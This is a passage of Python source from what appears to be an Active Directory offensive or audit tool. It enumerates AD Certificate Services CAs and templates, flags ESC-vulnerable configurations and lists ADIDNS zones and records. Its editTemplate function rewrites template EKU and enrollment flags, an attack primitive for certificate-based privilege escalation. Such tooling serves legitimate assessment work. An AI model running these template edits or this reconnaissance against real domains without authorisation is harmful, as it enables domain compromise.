							gpoContent = SMBUtil.readFile(connSMB, 'SYSVOL', gpoPath, True)
							lines = gpoContent.splitlines()
							canAddComputers = False

							sys.stdout = originalSTDOUT
							sys.stderr = originalSTDERR
							for line in lines:
								if line.startswith("SeMachineAccountPrivilege = "):
									for sid in sids.keys():
										if line.find(sid) != -1:
											canAddComputers = True
											print(f"\t[+] {sids[sid]} can add computers. Adding domain computers to SIDs")
											sids[domainComputersSID] = "Domain Computers"
											break
							if not canAddComputers:
								print("\t[-] No provided objects can add computers. Domain computers not added to SIDs", file = sys.stderr)
					except:
						sys.stdout = originalSTDOUT
						sys.stderr = originalSTDERR
						print("\t[-] Failed to read GPO Default Domain Controllers Policy. Domain computers not added to SIDs", file = sys.stderr)
				else: # Cannot add computers to domain. Pass
					print(f"\t[-] MAQ = {maq}. Domain computers not added to SIDs")
			
			print("[+] Current mapping")
			for key, val in sids.items():
				print(f"\t[+] {key}: {val}")

		baseDNCAs = f"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,{server.info.other['defaultNamingContext'][0]}"
		baseDNTemplates = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{server.info.other['defaultNamingContext'][0]}"
		entry_generator_cas = search(conn, server, baseDN = baseDNCAs, filter = "(objectClass=pKIEnrollmentService)", attributes = [
			'name',
			'dNSHostName',
			"cACertificateDN",
			"cACertificate",
			"certificateTemplates"])
		controls = security_descriptor_control(sdflags = SD_FLAGS_CONTROL.OWNER_SECURITY_INFORMATION + SD_FLAGS_CONTROL.GROUP_SECURITY_INFORMATION + SD_FLAGS_CONTROL.DACL_SECURITY_INFORMATION)
		entry_generator_templates = search(conn, server, baseDN = baseDNTemplates, filter = "(objectclass=pkicertificatetemplate)", attributes = [
			'name',
			'displayName',
			"pKIExpirationPeriod",
			"pKIOverlapPeriod",
			"msPKI-Enrollment-Flag",
			"msPKI-Private-Key-Flag",
			"msPKI-Certificate-Name-Flag",
			"msPKI-Minimal-Key-Size",
			"msPKI-RA-Signature",
			"msPKI-RA-Application-Policies",
			"msPKI-Template-Schema-Version",
			"pKIExtendedKeyUsage",
			"nTSecurityDescriptor"], controls = controls)
		
		haveCAs = False
		enabledTemplates = {}

		# Get CA configuration
		for entry in entry_generator_cas:
			if entry["type"] == "searchResEntry":
				caName = entry['raw_attributes']['name'][0].decode()
				caFQDN = entry['raw_attributes']['dNSHostName'][0].decode()
				if caName != []:
					haveCAs = True
					print("[+] Found Certificate Authority")
					print(f"\t[+] Name = {caName}\n\t[+] FQDN = {caFQDN}")

					print(f"\t[+] Get CA configuration with RPC through MS-DCOM x MS-CSRA")
					originalSTDOUT = sys.stdout
					originalSTDERR = sys.stderr
					capturedSTDERR = StringIO()
					sys.stdout = StringIO()
					sys.stderr = capturedSTDERR
					caUserSpecifiedSAN, caRequestDisposition, caEnforceEncICertReq, caSD, caWebEnrollment = (None, None, None, None, None)
					caConf = True
					try:
						caUserSpecifiedSAN, caRequestDisposition, caEnforceEncICertReq, caSD, caWebEnrollment = RPCUtil.getCAConfigCSRA(ip, user, pwd, domain, nthash, aesKey, ccache, caName, caFQDN)
						sys.stdout = originalSTDOUT
						sys.stderr = originalSTDERR
						print(f"\t[+] User specified SAN = {caUserSpecifiedSAN}\n\t[+] Request disposition = {caRequestDisposition}\n\t[+] Encrypted certificate request required = {caEnforceEncICertReq}\n\t[+] Web enrollment = {caWebEnrollment}")
					except Exception:
						err = capturedSTDERR.getvalue().split('\n')[0]
						sys.stdout = originalSTDOUT
						sys.stderr = originalSTDERR
						print(f"\t\t{err}", file = sys.stderr)
						print(f"\t[+] Get CA configuration with RPC through MS-RRP")
						sys.stdout = StringIO()
						capturedSTDERR = StringIO()
						sys.stderr = capturedSTDERR
						try:
							caUserSpecifiedSAN, caRequestDisposition, caEnforceEncICertReq, caSD, caWebEnrollment = RPCUtil.getCAConfigRRP(ip, user, pwd, domain, nthash, aesKey, ccache, caName, caFQDN)
							sys.stdout = originalSTDOUT
							sys.stderr = originalSTDERR
							print(f"\t[+] User specified SAN = {caUserSpecifiedSAN}\n\t[+] Request disposition = {caRequestDisposition}\n\t[+] Encrypted certificate request required = {caEnforceEncICertReq}\n\t[+] Web enrollment = {caWebEnrollment}")
						except Exception:
							err = capturedSTDERR.getvalue().split('\n')[0]
							sys.stdout = originalSTDOUT
							sys.stderr = originalSTDERR
							print(f"\t\t{err}", file = sys.stderr)
							sys.stdout = originalSTDOUT
							caConf = False
							pass

					if objects != [] and caConf:
						vulnerable, ESCX = isVulnerableADCS(conn, server, caSD, sids, caWebEnrollment, caUserSpecifiedSAN, None, None, None, None)
						print(f"\t[+] ESCX = {ESCX}")

					caSubjectName = entry['raw_attributes']['cACertificateDN'][0].decode()
					caCert = x509.Certificate.load(entry['raw_attributes']['cACertificate'][0])["tbs_certificate"]
					caSerialNumber = hex(int(caCert["serial_number"]))[2:].upper()
					caValidity = caCert["validity"].native
					caValidityStart = str(caValidity["not_before"])
					caValidityEnd = str(caValidity["not_after"])
					if caConf:
						print("\t[+] ACLs")
						parseDACL(conn, server, caSD, True, indent = 2)
					
					enabledTemplates[caName] = entry['raw_attributes']['certificateTemplates']

		# Get templates configuration
		i = 0
		global PAGED_SIZE
		for entry in entry_generator_templates:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				tplName = entry['raw_attributes']['name'][0].decode()
				
				tplDisplayName = entry['raw_attributes']['displayName'][0].decode()

				tplEnable = False
				tplCAName = "<Unknown>"
				if enabledTemplates != {}:
					for CANameTemplates in enabledTemplates.keys():
						if tplName.encode() in enabledTemplates[CANameTemplates]:
							tplEnable = True
							tplCAName = CANameTemplates
							break

				tplSchemaVersion = entry['raw_attributes']['msPKI-Template-Schema-Version'][0].decode()
				
				tplValidPeriod = filetime_to_str(entry['raw_attributes']['pKIExpirationPeriod'][0])
				tplRenewalPeriod = filetime_to_str(entry['raw_attributes']['pKIOverlapPeriod'][0])
				
				tplCertNameFlag = entry['raw_attributes']['msPKI-Certificate-Name-Flag']
				if tplCertNameFlag != []:
					tplCertNameFlag = MS_PKI_CERTIFICATE_NAME_FLAG(int(tplCertNameFlag[0].decode()))
				else:
					tplCertNameFlag = MS_PKI_CERTIFICATE_NAME_FLAG(0)
				tplCertName = tplCertNameFlag.to_str_list()

				tplEnrollmentFlag = entry['raw_attributes']['msPKI-Enrollment-Flag']
				if tplEnrollmentFlag != []:
					tplEnrollmentFlag = MS_PKI_ENROLLMENT_FLAG(int(tplEnrollmentFlag[0].decode()))
				else:
					tplEnrollmentFlag = MS_PKI_ENROLLMENT_FLAG(0)
				tplEnrollment = tplEnrollmentFlag.to_str_list()

				tplPrivKeyFlag = entry['raw_attributes']['msPKI-Private-Key-Flag']
				if tplPrivKeyFlag != []:
					tplPrivKeyFlag = MS_PKI_PRIVATE_KEY_FLAG(int(tplPrivKeyFlag[0].decode()))
				else:
					tplPrivKeyFlag = MS_PKI_PRIVATE_KEY_FLAG(0)
				tplPrivKey = tplPrivKeyFlag.to_str_list()

				tplAuthSigReq = entry['raw_attributes']['msPKI-RA-Signature']
				if tplAuthSigReq != []:
					tplAuthSigReq = int(tplAuthSigReq[0].decode())
				else:
					tplAuthSigReq = 0

				tplAppPolicies = entry['raw_attributes']['msPKI-RA-Application-Policies']
				if not isinstance(tplAppPolicies, list):
					if tplAppPolicies is None:
						tplAppPolicies = []
					else:
						tplAppPolicies = [tplAppPolicies]
				tplAppPolicies = list(map(lambda x: x.decode(), tplAppPolicies))
				tplAppPolicies = list(map(lambda x: OID_TO_STR_MAP[x] if x in OID_TO_STR_MAP else x, tplAppPolicies,))

				tplEKU = entry['raw_attributes']['pKIExtendedKeyUsage']
				if not isinstance(tplEKU, list):
					if tplEKU is None:
						tplEKU = []
					else:
						tplEKU = [tplEKU]

				tplEKU = list(map(lambda x: x.decode(), tplEKU))
				tplEKU = list(map(lambda x: OID_TO_STR_MAP[x] if x in OID_TO_STR_MAP else x, tplEKU))
				tplAnyPurpose = ("Any Purpose" in tplEKU or len(tplEKU) == 0)
				tplClientAuthentication = tplAnyPurpose or any(eku in tplEKU for eku in ["Client Authentication", "Smart Card Logon", "PKINIT Client Authentication"])
				tplEnrollmentAgent = tplAnyPurpose or any(eku in tplEKU for eku in ["Certificate Request Agent"])

				tplEnrolleeSuppliesSubject = any(flag in tplCertNameFlag for flag in [MS_PKI_CERTIFICATE_NAME_FLAG.ENROLLEE_SUPPLIES_SUBJECT])
				tplRequiresManagerApproval = (MS_PKI_ENROLLMENT_FLAG.PEND_ALL_REQUESTS in tplEnrollmentFlag)
				tplNoSecurityExtension = (MS_PKI_ENROLLMENT_FLAG.NO_SECURITY_EXTENSION in tplEnrollmentFlag)
				tplRequiresKeyArchival = (MS_PKI_PRIVATE_KEY_FLAG.REQUIRE_PRIVATE_KEY_ARCHIVAL in tplPrivKeyFlag)

				tplSD = SECURITY_DESCRIPTOR.from_bytes(entry['raw_attributes']['nTSecurityDescriptor'][0])

				vulnerable = False
				if objects != []:
					vulnerable, ESCX = isVulnerableADCS(conn, server, tplSD, sids, None, None, tplEKU, tplRequiresManagerApproval, tplEnrolleeSuppliesSubject, tplSchemaVersion)

				if vulnerable or objects == []:
					print(f"[+] Displaying template '{tplName}'")
					print(f"\t[+] CA ".ljust(40) + f"= {tplCAName}")
					print(f"\t[+] Template Schema Version ".ljust(40) + f"= {tplSchemaVersion}")
					print(f"\t[+] Display Name ".ljust(40) + f"= {tplDisplayName}")
					print(f"\t[+] Enabled ".ljust(40) + f"= {tplEnable}")
					print(f"\t[+] Client Authentication ".ljust(40) + f"= {tplClientAuthentication}")
					print(f"\t[+] Enrollment Agent ".ljust(40) + f"= {tplEnrollmentAgent}")
					print(f"\t[+] Any Purpose ".ljust(40) + f"= {tplAnyPurpose}")
					print(f"\t[+] Enrollee Supplies Subject ".ljust(40) + f"= {tplEnrolleeSuppliesSubject}")
					print(f"\t[+] Certificate Name Flag ".ljust(40) + f"= {tplCertNameFlag}")
					print(f"\t[+] Enrollment Flag ".ljust(40) + f"= {tplEnrollmentFlag}")
					print(f"\t[+] Private Key Flag ".ljust(40) + f"= {tplPrivKeyFlag}")
					print(f"\t[+] Extended Key Usage ".ljust(40) + f"= {tplEKU}")
					print(f"\t[+] Requires Manager Approval ".ljust(40) + f"= {tplRequiresManagerApproval}")
					print(f"\t[+] Requires Key Archival ".ljust(40) + f"= {tplRequiresKeyArchival}")
					print(f"\t[+] Application Policies ".ljust(40) + f"= {tplAppPolicies}")
					print(f"\t[+] Authorized Signatures Required ".ljust(40) + f"= {tplAuthSigReq}")
					print(f"\t[+] Validity Period ".ljust(40) + f"= {tplValidPeriod}")
					print(f"\t[+] Renewal Period ".ljust(40) + f"= {tplRenewalPeriod}")
					print(f"\t[+] Minimum RSA Key Length ".ljust(40) + f"= {entry['raw_attributes']['msPKI-Minimal-Key-Size'][0].decode()}")
					if objects != []:
						print(f"\t[+] ESCX = {ESCX}")
					print("\t[+] ACLs")
					parseDACL(conn, server, tplSD, False, indent = 2)
		
		if not haveCAs:
			print("[-] No CAs found", file = sys.stderr)
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def editTemplate(conn, server, tplName, eku, certificateNameFlag, enrollmentFlag):
	print_yellow("[*] Editing Active Directory Certificate Services Template")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("\n[-] No LDAP connection available", file = sys.stderr)
			return
		
		if eku == None and certificateNameFlag == None and enrollmentFlag == None:
			print("[-] No EKU, Certificate Name Flag or Enrollment Flag provided", file = sys.stderr)
			return

		dn = None
		base_dn = f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{server.info.other['defaultNamingContext'][0]}"
		entry_generator = search(conn, server, baseDN = base_dn, filter = f"(displayName={tplName})", attributes = ["distinguishedName"])
		for entry in entry_generator:
			if entry["type"] == "searchResEntry":
				dn = entry["raw_attributes"]["distinguishedName"][0].decode()

		if dn == None:
			print("[-] Provided ADCS Template not found", file = sys.stderr)
			return

		if eku != None:
			eku = eku.split(',')
			eku = [OID_TO_STR_MAP_INV[x].encode() for x in eku]
			conn.modify(dn, {'pKIExtendedKeyUsage': [(MODIFY_REPLACE, eku)]})
			if conn.result['result'] == 0:
				print("[+] Extended Key Usage successfully modified")
			else:
				print("[-] Failed to modify Extended Key Usage of template", file = sys.stderr)

		if certificateNameFlag != None:
			certificateNameFlags = certificateNameFlag.split(',')
			flagValue = 0
			for flag in certificateNameFlags:
				value = getattr(MS_PKI_CERTIFICATE_NAME_FLAG, flag, None)
				if value is None:
					print(f"[-] Invalid Certificate Name Flag '{flag}'", file = sys.stderr)
				flagValue |= value.value
			conn.modify(dn, {'msPKI-Certificate-Name-Flag': [(MODIFY_REPLACE, str(flagValue).encode())]})
			if conn.result['result'] == 0:
				print("[+] Certificate Name Flag successfully modified")
			else:
				print("[-] Failed to modify Certificate Name Flag of template", file = sys.stderr)
		
		if enrollmentFlag != None:
			enrollmentFlags = enrollmentFlag.split(',')
			flagValue = 0
			for flag in enrollmentFlags:
				value = getattr(MS_PKI_ENROLLMENT_FLAG, flag, None)
				if value is None:
					print(f"[-] Invalid Enrollment Flag '{flag}'", file = sys.stderr)
				flagValue |= value.value
			conn.modify(dn, {'msPKI-Enrollment-Flag': [(MODIFY_REPLACE, str(flagValue).encode())]})
			if conn.result['result'] == 0:
				print("[+] Enrollment Flag successfully modified")
			else:
				print("[-] Failed to modify Enrollment Flag of template", file = sys.stderr)

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

####################################################
#                     ADIDNS                       #
####################################################

class DNS_RECORD(Structure):
	"""
	dnsRecord - used in LDAP
	[MS-DNSP] section 2.3.2.2
	"""

	structure = (
		('DataLength', '<H-Data'),
		('Type', '<H'),
		('Version', 'B=5'),
		('Rank', 'B'),
		('Flags', '<H=0'),
		('Serial', '<L'),
		('TtlSeconds', '>L'),
		('Reserved', '<L=0'),
		('TimeStamp', '<L=0'),
		('Data', ':')
	)

# Over RPC, must replace DNS_COUNT_NAME with DNS_RPC_NAME for all DNS_RPC_XXX structures
# See MS-DNSP

class DNS_RPC_NAME(Structure):
	"""
	DNS_RPC_NAME
	Used for FQDNs in RPC communication.
	MUST be converted to DNS_COUNT_NAME for LDAP
	[MS-DNSP] section 2.2.2.2.1
	"""
	
	structure = (
		('cchNameLength', 'B-dnsName'),
		('dnsName', ':')
	)

class DNS_COUNT_NAME(Structure):
	"""
	DNS_COUNT_NAME
	Used for FQDNs in LDAP communication
	MUST be converted to DNS_RPC_NAME for RPC communication
	[MS-DNSP] section 2.2.2.2.2
	"""

	structure = (
		('Length', 'B-RawName'),
		('LabelCount', 'B'),
		('RawName', ':')
	)

	def toFqdn(self):
		ind = 0
		labels = []
		for i in range(self['LabelCount']):
			nextlen = struct.unpack('B', self['RawName'][ind:ind+1])[0]
			labels.append(self['RawName'][ind+1:ind+1+nextlen].decode('utf-8'))
			ind += nextlen + 1
		# For the final dot
		labels.append('')
		return '.'.join(labels)

class DNS_RPC_NODE(Structure):
	"""
	DNS_RPC_NODE
	[MS-DNSP] section 2.2.2.2.3
	"""

	structure = (
		('wLength', '>H'),
		('wRecordCount', '>H'),
		('dwFlags', '>L'),
		('dwChildCount', '>L'),
		('dnsNodeName', ':')
	)

class DNS_RPC_RECORD_A(Structure):
	"""
	DNS_RPC_RECORD_A
	[MS-DNSP] section 2.2.2.2.4.1
	"""

	structure = (
		('address', ':'),
	)

	def formatCanonical(self):
		return socket.inet_ntoa(self['address'])

	def fromCanonical(self, canonical):
		self['address'] = socket.inet_aton(canonical)


class DNS_RPC_RECORD_NODE_NAME(Structure):
	"""
	DNS_RPC_RECORD_NODE_NAME
	[MS-DNSP] section 2.2.2.2.4.2
	"""

	structure = (
		('nameNode', ':', DNS_COUNT_NAME),
	)

class DNS_RPC_RECORD_SOA(Structure):
	"""
	DNS_RPC_RECORD_SOA
	[MS-DNSP] section 2.2.2.2.4.3
	"""

	structure = (
		('dwSerialNo', '>L'),
		('dwRefresh', '>L'),
		('dwRetry', '>L'),
		('dwExpire', '>L'),
		('dwMinimumTtl', '>L'),
		('namePrimaryServer', ':', DNS_COUNT_NAME),
		('zoneAdminEmail', ':', DNS_COUNT_NAME)
	)

class DNS_RPC_RECORD_NULL(Structure):
	"""
	DNS_RPC_RECORD_NULL
	[MS-DNSP] section 2.2.2.2.4.4
	"""

	structure = (
		('bData', ':'),
	)

# Some missing structures here skipped

class DNS_RPC_RECORD_NAME_PREFERENCE(Structure):
	"""
	DNS_RPC_RECORD_NAME_PREFERENCE
	[MS-DNSP] section 2.2.2.2.4.8
	"""

	structure = (
		('wPreference', '>H'),
		('nameExchange', ':', DNS_COUNT_NAME)
	)

# Some missing structures here skipped

class DNS_RPC_RECORD_AAAA(Structure):
	"""
	DNS_RPC_RECORD_AAAA
	[MS-DNSP] section 2.2.2.2.4.17
	[MS-DNSP] section 2.2.2.2.4.17
	"""

	structure = (
		('ipv6Address', '16s'),
	)

class DNS_RPC_RECORD_SRV(Structure):
	"""
	DNS_RPC_RECORD_SRV
	[MS-DNSP] section 2.2.2.2.4.18
	"""
	
	structure = (
		('wPriority', '>H'),
		('wWeight', '>H'),
		('wPort', '>H'),
		('nameTarget', ':', DNS_COUNT_NAME)
	)

class DNS_RPC_RECORD_TS(Structure):
	"""
	DNS_RPC_RECORD_TS
	[MS-DNSP] section 2.2.2.2.4.23
	"""
	
	structure = (
		('entombedTime', '<Q'),
	)

	def toDatetime(self):
		microseconds = self['entombedTime'] / 10.
		return (datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=microseconds)).strftime("%d/%m/%Y %H:%M:%S %p")

RECORD_TYPE_MAPPING = {
	0: 'ZERO',
	1: 'A',
	2: 'NS',
	5: 'CNAME',
	6: 'SOA',
	33: 'SRV',
	65281: 'WINS'
}

def getNextSerial(zone):
	dnsresolver = dns.resolver.Resolver()
	try:
		res = dnsresolver.resolve(zone, 'SOA', tcp = False)
	except:
		try:
			res = dnsresolver.resolve(zone, 'SOA', tcp = True)
		except:
			return 0
		
	for answer in res:
		return answer.serial + 1

def newRecord(rtype, serial):
	nr = DNS_RECORD()
	nr['Type'] = rtype
	nr['Serial'] = serial
	nr['TtlSeconds'] = 180
	nr['Rank'] = 240 # From authoritive zone

	return nr

def printRecord(record):
	try:
		rtype = RECORD_TYPE_MAPPING[record['Type']]
	except KeyError:
		rtype = '<Unsupported>'
	print(f"\t\t[+] Type = {record['Type']} ({rtype})")
	print(f"\t\t[+] Serial = {record['Serial']}")

	# Tombstoned record
	if record['Type'] == 0:
		tstime = DNS_RPC_RECORD_TS(record['Data'])
		tsAt = tstime.toDatetime()
		print(f"\t\t[+] Tombstoned record at UTC time = {tsAt}")

	# A record
	if record['Type'] == 1:
		address = DNS_RPC_RECORD_A(record['Data']).formatCanonical()
		print(f"\t\t[+] Address = {address}")

	# NS record or CNAME record
	if record['Type'] == 2 or record['Type'] == 5:
		address = DNS_RPC_RECORD_NODE_NAME(record['Data'])
		print(f"\t\t[+] Address = {address}")

	# SRV record
	if record['Type'] == 33:
		record_data = DNS_RPC_RECORD_SRV(record['Data'])
		print(f"\t\t[+] Priority = {record_data['wPriority']}")
		print(f"\t\t[+] Weight = {record_data['wWeight']}")
		print(f"\t\t[+] Port = {record_data['wPort']}")
		print(f"\t\t[+] Name = {record_data['nameTarget'].toFqdn()}")

	# SOA record
	if record['Type'] == 6:
		record_data = DNS_RPC_RECORD_SOA(record['Data'])
		# record_data.dump()
		print(f"\t\t[+] Serial = {record_data['dwSerialNo']}")
		print(f"\t\t[+] Refresh = {record_data['dwRefresh']}")
		print(f"\t\t[+] Retry = {record_data['dwRetry']}")
		print(f"\t\t[+] Expire = {record_data['dwExpire']}")
		print(f"\t\t[+] Minimum TTL = {record_data['dwMinimumTtl']}")
		print(f"\t\t[+] Primary server = {record_data['namePrimaryServer'].toFqdn()}")
		print(f"\t\t[+] Zone admin email = {record_data['zoneAdminEmail'].toFqdn()}")

def listZones(conn, server, signing, ldaps, startTLS, channelBinding, username, domain, aesKey, ccache):
	print_yellow("[*] Listing ADIDNS Zones")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		domainRootDN = server.info.other['defaultNamingContext'][0]
		domainBaseDN = f"CN=MicrosoftDNS,DC=DomainDnsZones,{domainRootDN}"

		legacyBaseDN = f"CN=MicrosoftDNS,CN=System,{domainRootDN}"

		forestRootDN = server.info.other['rootDomainNamingContext'][0]
		forestBaseDN = f"CN=MicrosoftDNS,DC=ForestDnsZones,{forestRootDN}"

		global PAGED_SIZE

		# Domain DNS partition

		print("[+] Searching zones into Domain DNS partition")
		entry_generator_domain = search(conn, server, baseDN = domainBaseDN, filter = "(objectClass=dnsZone)", attributes = ["dc"])
		nbentries = 0
		i = 0
		for entry in entry_generator_domain:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				dc = entry["raw_attributes"]["dc"][0].decode()
				print(f"\t[+] {dc}")
		if nbentries == 0:
			print("\t[-] No DNS zones found", file = sys.stderr)

		# Legacy DNS partition
		
		print("[+] Searching zones into Legacy DNS partition")
		entry_generator_legacy = search(conn, server, baseDN = legacyBaseDN, filter = "(objectClass=dnsZone)", attributes = ["dc"])
		nbentries = 0
		i = 0
		for entry in entry_generator_legacy:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				dc = entry["raw_attributes"]["dc"][0].decode()
				print(f"\t[+] {dc}")
		if nbentries == 0:
			print("\t[-] No DNS zones found", file = sys.stderr)
		
		# Forest DNS partition

		if forestRootDN != domainRootDN and (ccache != None or aesKey != None): # ST is required

			targetDomain = ('.'.join([x.strip("DC=") for x in forestRootDN.split(",")])).lower()
			foundKDCHost = True
			kdcHost = None

			print(f"[+] Connecting with Kerberos to {targetDomain.upper()} for Forest DNS partition")
			
			# We need the PDC FQDN for the target domain to request a valid SPN
			# Find It by querying SRV record for '_ldap._tcp.pdc._msdcs.<FQDN>' through UDP and TCP
			try:
				kdcHost = str(dns.resolver.resolve(f"_ldap._tcp.pdc._msdcs.{targetDomain}", "SRV", tcp = False)[0].target)[:-1]
			except:
				try:
					kdcHost = str(dns.resolver.resolve(f"_ldap._tcp.pdc._msdcs.{targetDomain}", "SRV", tcp = True)[0].target)[:-1]
				except:
					foundKDCHost = False
			
			if not foundKDCHost:
				print(f"[-] Could not find PDC FQDN for root forest domain {targetDomain.upper()}", file = sys.stderr)
				return

			originalSTDOUT = sys.stdout
			sys.stdout = StringIO()
			conn, server = connect_ldap(kdcHost, signing, ldaps, startTLS, channelBinding, username, '', '', domain, aesKey, ccache, None, None, None)
			sys.stdout = originalSTDOUT
			if conn == '':
				return

		print("[+] Searching zones into Forest DNS partition")

		entry_generator_forest = search(conn, server, baseDN = forestBaseDN, filter = "(objectClass=dnsZone)", attributes = ["dc"])
		nbentries = 0
		i = 0
		for entry in entry_generator_forest:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				dc = entry["raw_attributes"]["dc"][0].decode()
				print(f"\t[+] {dc}")
		if nbentries == 0:
			print("\t[-] No DNS zones found", file = sys.stderr)

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)
	
def listRecords(conn, server, zone, signing, ldaps, startTLS, channelBinding, username, domain, aesKey, ccache):
	print_yellow("[*] Listing ADIDNS Records")
	print_yellow("---")
	print()

	try:
		if conn == '':
			print("[-] No LDAP connection available", file = sys.stderr)
			return

		domainRootDN = server.info.other['defaultNamingContext'][0]
		domainBaseDN = f"CN=MicrosoftDNS,DC=DomainDnsZones,{domainRootDN}"
		zoneDomainBaseDN = f"DC={zone},{domainBaseDN}"

		legacyBaseDN = f"CN=MicrosoftDNS,CN=System,{domainRootDN}"
		zoneLegacyBaseDN = f"DC={zone},{legacyBaseDN}"

		forestRootDN = server.info.other['rootDomainNamingContext'][0]
		forestBaseDN = f"CN=MicrosoftDNS,DC=ForestDnsZones,{forestRootDN}"
		zoneForestBaseDN = f"DC={zone},{forestBaseDN}"

		global PAGED_SIZE

		# Search zone into Domain DNS partition

		print(f"[+] Searching records for zone {zone} into Domain DNS partition")
		entry_generator_domain = search(conn, server, baseDN = zoneDomainBaseDN, attributes = ["dnsRecord", "dNSTombstoned", "name"])
		nbentries = 0
		i = 0
		for entry in entry_generator_domain:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				dnsRecordsRaw = entry["raw_attributes"]["dnsRecord"]
				tombstoned = entry["raw_attributes"]["dNSTombstoned"]
				name = entry["raw_attributes"]["name"]
				if name == []: # No permission to view the record
					pass
				else:
					name = name[0].decode()
					print(f"\t[+] {name}")
					if tombstoned != []:
						tombstoned = True if tombstoned[0].decode() == "TRUE" else False
					else:
						tombstoned = "<Unknown>"
					print(f"\t\t[+] Entry Tombstoned = {tombstoned}")

					if dnsRecordsRaw != []:
						for idx, dnsRecordRaw in enumerate(dnsRecordsRaw):
							print(f"\t\t----- Record {idx} -----")
							dnsRecord = DNS_RECORD(dnsRecordRaw)
							printRecord(dnsRecord)
					else:
						print("\t\t[-] No access or empty", file = sys.stderr)
					
					
		if nbentries == 0:
			print("\t[-] Zone not found or no DNS records", file = sys.stderr)

		# Legacy DNS partition
		
		print(f"[+] Searching records for zone {zone} into Legacy DNS partition")
		entry_generator_legacy = search(conn, server, baseDN = zoneLegacyBaseDN, attributes = ["dnsRecord", "dNSTombstoned", "name", "distinguishedName"])
		nbentries = 0
		i = 0
		for entry in entry_generator_legacy:
			i += 1
			if (i % PAGED_SIZE == 0):
				maybeSleep()
			if entry["type"] == "searchResEntry":
				nbentries += 1
				dnsRecordsRaw = entry["raw_attributes"]["dnsRecord"]
				tombstoned = entry["raw_attributes"]["dNSTombstoned"]
				name = entry["raw_attributes"]["name"]
				if name == []: # No permission to view the record
					pass
				else:
					name = name[0].decode()
					print(f"\t[+] {name}")
					if tombstoned != []:
						tombstoned = True if tombstoned[0].decode() == "TRUE" else False
					else:
						tombstoned = "<Unknown>"
					print(f"\t\t[+] Entry Tombstoned = {tombstoned}")

					if dnsRecordsRaw != []:
						for idx, dnsRecordRaw in enumerate(dnsRecordsRaw):
							print(f"\t\t----- Record {idx} -----")
							dnsRecord = DNS_RECORD(dnsRecordRaw)
							printRecord(dnsRecord)
					else:
						print("\t\t[-] No access or empty", file = sys.stderr)
		if nbentries == 0:
			print("\t[-] Zone not found or no DNS records", file = sys.stderr)
		
		# Forest DNS partition

		krbConnEstablished = False
		useKRB = False
		if forestRootDN != domainRootDN and (ccache != None or aesKey != None): # ST is required
			useKRB = True

			targetDomain = ('.'.join([x.strip("DC=") for x in forestRootDN.split(",")])).lower()
			foundKDCHost = True
			kdcHost = None

			print(f"[+] Connecting with Kerberos to {targetDomain.upper()} for Forest DNS partition")
			
			# We need the PDC FQDN for the target domain to request a valid SPN
			# Find It by querying SRV record for '_ldap._tcp.pdc._msdcs.<FQDN>' through UDP and TCP
			try:
				kdcHost = str(dns.resolver.resolve(f"_ldap._tcp.pdc._msdcs.{targetDomain}", "SRV", tcp = False)[0].target)[:-1]
			except:
				try:
					kdcHost = str(dns.resolver.resolve(f"_ldap._tcp.pdc._msdcs.{targetDomain}", "SRV", tcp = True)[0].target)[:-1]
				except:
					foundKDCHost = False
			
			if not foundKDCHost:
				print(f"[-] Could not find PDC FQDN for root forest domain {targetDomain.upper()}", file = sys.stderr)
			else:
				originalSTDOUT = sys.stdout
				sys.stdout = StringIO()
				conn, server = connect_ldap(kdcHost, signing, ldaps, startTLS, channelBinding, username, '', '', domain, aesKey, ccache, None, None, None)
				sys.stdout = originalSTDOUT
				if conn == '':
					return
				else:
					krbConnEstablished = True

		if (useKRB and krbConnEstablished) or not useKRB:
			print(f"[+] Searching records for zone {zone} into Forest DNS partition")

			entry_generator_forest = search(conn, server, baseDN = zoneForestBaseDN, attributes = ["dnsRecord", "dNSTombstoned", "name", "distinguishedName"])
			nbentries = 0
			i = 0
			for entry in entry_generator_forest:
				i += 1
				if (i % PAGED_SIZE == 0):
					maybeSleep()
				if entry["type"] == "searchResEntry":
					nbentries += 1
					dnsRecordsRaw = entry["raw_attributes"]["dnsRecord"]
					tombstoned = entry["raw_attributes"]["dNSTombstoned"]
					name = entry["raw_attributes"]["name"]
					if name == []: # No permission to view the record
						pass
					else:
						name = name[0].decode()
						print(f"\t[+] {name}")
						if tombstoned != []:
							tombstoned = True if tombstoned[0].decode() == "TRUE" else False
						else:
							tombstoned = "<Unknown>"
						print(f"\t\t[+] Entry Tombstoned = {tombstoned}")

						if dnsRecordsRaw != []:
							for idx, dnsRecordRaw in enumerate(dnsRecordsRaw):
								print(f"\t\t----- Record {idx} -----")
								dnsRecord = DNS_RECORD(dnsRecordRaw)
								printRecord(dnsRecord)
						else:
							print("\t\t[-] No access or empty", file = sys.stderr)
			if nbentries == 0:
				print("\t[-] Zone not found or no DNS records", file = sys.stderr)

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
